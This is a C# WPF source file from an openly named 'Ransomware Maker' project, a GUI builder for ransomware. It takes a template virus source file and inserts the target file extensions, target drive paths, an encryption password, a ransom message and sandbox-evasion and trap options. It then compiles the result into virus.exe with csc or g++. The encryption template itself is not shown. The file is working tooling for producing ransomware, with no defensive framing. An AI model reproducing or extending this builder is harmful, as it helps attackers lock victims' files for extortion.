using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Input;
#pragma warning disable CS8509 
namespace Ransomware_Maker.cs
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public bool isPrompted;
        public MainWindow()
        {
            InitializeComponent();
            if (!(File.Exists("virus.cc") || File.Exists("virus.cs")))
            {
                MessageBox.Show("source code file not found.",Title,MessageBoxButton.OK,MessageBoxImage.Error);
                Application.Current.Shutdown(1);
            }
        }
        private static string GetCscCompiler(string bit = "Framework")
        {
            string frameworkPath = $"C:\\Windows\\Microsoft.NET\\{bit}\\";
            if (!Directory.Exists(frameworkPath))
            {
                MessageBox.Show("Folder path not Folder directory does not exist, fallback to 32-bit.", "Warning", MessageBoxButton.OK, MessageBoxImage.Error);
                frameworkPath = "C:\\Windows\\Microsoft.NET\\Framework\\";
            }
            List<string> compilers = new();
            foreach (var entry in new DirectoryInfo(frameworkPath).EnumerateDirectories())
            {
                if (entry.Name.Contains('v'))
                {
                    compilers.Add(entry.FullName);
                }
            }

            Dictionary<int, string> temp = new();
            foreach (var compiler in compilers)
            {
                string[] parts = compiler.Split('\\');
                int version = int.Parse(parts[4].Substring(1, 3).Replace(".", ""));
                temp[version] = parts[4];
            }

            string selectedCompiler = temp[temp.Keys.Max()];

            return frameworkPath + selectedCompiler + "\\csc.exe";
        }
        private void Rdb_cpp_Checked(object sender, RoutedEventArgs e)
        {
            OpenFileDialog openFileDialog = new()
            {
                Filter = "Executable Files|g++.exe",
                Title = "Compiler for MinGW-w64 GCC that supports c++11"
            };

            if (openFileDialog.ShowDialog() == true)
            {
                string selectedFileName = openFileDialog.FileName;
                lbl_compiler.Content = selectedFileName;
            }
            else
            {
                MessageBox.Show("Please select the correct compiler file!", "Warning", MessageBoxButton.OK, MessageBoxImage.Error);
                rdb_cpp.IsChecked = false;
                rdb_cs.IsChecked = true;
            }
        }
        private void Lbl_open_source_MouseDown(object sender, MouseButtonEventArgs e)
        {
            //调用系统默认的浏览器 
            Process.Start(new ProcessStartInfo { FileName = "https://github.com/kaixinol/Ransomware-Maker.cs", UseShellExecute = true });
        }


        private void Rdb_cs_Loaded(object sender, RoutedEventArgs e)
        {
            rdb_cs.IsChecked = true;
        }
        private void Rdb_cs_Checked(object sender, RoutedEventArgs e)
        {
            lbl_compiler.Content = GetCscCompiler();
        }

        private void Lbl_compiler_MouseDown(object sender, MouseButtonEventArgs e)
        {
            Process.Start("explorer.exe", $"/select,\"{lbl_compiler.Content}\"");
        }

        private void Btn_generate_Click(object sender, RoutedEventArgs e)
        {
            string lang = rdb_cs.IsChecked == true ? "c#" : "c++";
            string suffix = lang == "c#" ? "cs" : "cc";
            string? path = GenerateCode(lang == "c#" ? "virus.cs" : "virus.cc", suffix);
            if(path == null )
            {
                MessageBox.Show("An error occurred while generating the code", Title, MessageBoxButton.OK, MessageBoxImage.Error);
                return;
            }
            bool smallest = chk_resize.IsChecked == true;
            string outputOption = lang switch
            {
                "c#" => " /out:virus.exe ",
                "c++" => " -o virus ",
            };
            string cmd = $"{lbl_compiler.Content} {outputOption} {path} {AddArgv(lang,smallest)} ";
            // Clipboard.SetText(cmd);
            string result = ExecCmd(cmd);
            if (string.Empty == result)
            {
                MessageBox.Show("Compiled successfully", Title, MessageBoxButton.OK, MessageBoxImage.Information);
                if (!isPrompted)
                {
                    Process.Start("explorer.exe", $"/select,virus.exe");
                    isPrompted = true;
                }
            }
            else
            {
                MessageBox.Show(result, Title, MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }
        string AddArgv(string langType, bool smallest)
        {
            string result = langType switch
            {
                "c#" => "",
                "c++" => " -static ",
            };

            if (smallest)
            {
                result += langType switch
                {
                    "c#" => " /optimize /debug- ",
                    "c++" => " -s ",
                };
            }
            if (chk_64bit.IsChecked==true)
            {
                result += langType switch
                {
                    "c#" => " /platform:x64 ",
                    "c++" => " -m64 ",
                };
            }

            return result;
        }

        static string ExecCmd(string cmd)
            {
                ProcessStartInfo psi = new()
                {
                    FileName = "cmd.exe",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    Arguments = "/c " + cmd
                };

            using Process process = new();
            process.StartInfo = psi;
            process.Start();
            string output =process.StandardOutput.ReadToEnd().Trim()+process.StandardError.ReadToEnd().Trim();
            process.WaitForExit();
            if (process.ExitCode != 0)
            {
                return output;
            }
            return string.Empty;
        }

        private string? GenerateCode(string path,string suffix)
        {
            string data = "";
            try
            {
                using StreamReader reader = new(path);
                data = reader.ReadToEnd();
            }
            catch
            {
                return null;
            }

            string[] suffixes = tbox_suffix_list.Text.Split(",");
            string formattedSuffixes = string.Join(",", suffixes.Select(suffix => $"\"{suffix.Trim()}\""));

            string encryptedSuffixes = tbox_suffix.Text;
            string password = tbox_password.Text;
            string input = Microsoft.VisualBasic.Interaction.InputBox("Please fill in the path group to be encrypted (like c:/path,d:/path)","","c:/");

            if (string.IsNullOrEmpty(input))
            {
                MessageBox.Show("Path cannot be empty", Title ,MessageBoxButton.OK, MessageBoxImage.Error);
                return null;
            }
            string[] directories = input.Split(",");
            string formattedDirectories = string.Join(",", directories.Select(directory => $"\"{directory.Trim()}\""));
            static string lambdaFunction(bool x) => x ? "true" : "false";
            string msg = tbox_warning.Text;
            string sandbox = lambdaFunction(chk_sandbox.IsChecked == true);
            string trap = lambdaFunction(chk_trap.IsChecked == true);

            Tuple<string, string>[] replacements = new Tuple<string, string>[]
            {
                new Tuple<string, string>(formattedSuffixes, "#SUFFIES#"),
                new Tuple<string, string>($"\"{encryptedSuffixes}\"", "#ENCRYPTED_SUFFIX#"),
                new Tuple<string, string>($"{Escape(password)}", "#PASSWORD#"),
                new Tuple<string, string>($"{formattedDirectories}", "#DIRECTORIES#"),
                new Tuple<string, string>($"{Escape(msg)}", "#MSG#"),
                new Tuple<string, string>(sandbox, "#SANDBOX#"),
                new Tuple<string, string>(trap, "#TRAP#")
            };

            foreach (Tuple<string, string> replacement in replacements)
            {
                data = data.Replace(replacement.Item2, replacement.Item1);
            }

            string randomStr = new(Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", 6)
                .Select(s => s[new Random().Next(s.Length)]).ToArray());

            string tempPath = Path.GetTempPath();

            string filePath = Path.Combine(tempPath, $"{randomStr}.{suffix}");

            using (StreamWriter writer = new(filePath))
            {
                writer.Write(data);
            }
            return filePath;
        }

        static string Escape(string s)
        {
            return "\"" + s.Replace("\"", "\\\"").Replace("\n", "\\n") + "\"";
        }
        private void Chk_64bit_Checked(object sender, RoutedEventArgs e)
        {
            if (rdb_cs.IsChecked == true)
                lbl_compiler.Content = GetCscCompiler("Framework64");
        }

        private void Chk_64bit_Unchecked(object sender, RoutedEventArgs e)
        {
            if(rdb_cs.IsChecked==true)
                lbl_compiler.Content = GetCscCompiler();
        }

    }


}
